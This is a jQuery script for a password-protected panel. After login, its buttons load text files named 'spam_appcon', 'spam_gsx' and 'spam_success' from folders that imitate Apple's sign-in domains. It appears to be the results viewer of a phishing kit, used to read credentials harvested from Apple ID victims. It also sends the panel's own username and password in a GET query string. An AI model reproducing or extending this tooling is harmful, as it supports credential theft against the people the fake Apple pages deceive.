$(document).ready(function(){

$("#login_error").hide(0);
$("#menu").hide(0);
$("#res").hide(0);
 $("#login-button").click(function(event){
		 event.preventDefault();

						var user=$("#Username").val().toString();
						var pass=$("#Password").val().toString();	
						var link=$("");


							if(user=='') 

								{	 

									$("#login_error").show(0);
									$('.wrapper').addClass('form-erreur');



								}	
							else 

								{ 

										$.ajax

											({ 

					

												type: "GET", 

												url: "login/Login.php?user="+user+"&pass="+pass,

												data:"user="+user+"&pass="+pass,


												success: function(data)

													{ 
														if(data=="OK")

															{
																$("#login_error").hide(0);
																$('form').fadeOut(500);
																$('.wrapper').addClass('form-success');						
																$('#h1').fadeOut(500);
																$('#menu').show(500);
																
																														
															}

														else

															{
																$("#login_error").show(0);
																$('.wrapper').addClass('form-erreur');

		
															}

														} 

												});
										}
	 
});

$(".1").click(function(event){
	 event.preventDefault();
	$('#res').show(50);
	$("#res").load("../idmsa.apple.com/IDMSWebAuth/spam_appcon.txt");

    });
$(".2").click(function(event){
	 event.preventDefault();
	$('#res').show(50);
	$("#res").load("../idmsa.apple.com/IDMSWebAuth/spam_gsx.txt");

    });
$(".3").click(function(event){
	 event.preventDefault();
	$('#res').show(50);
	$("#res").load("../icloud.apple/spam_success.txt");

    });

   });
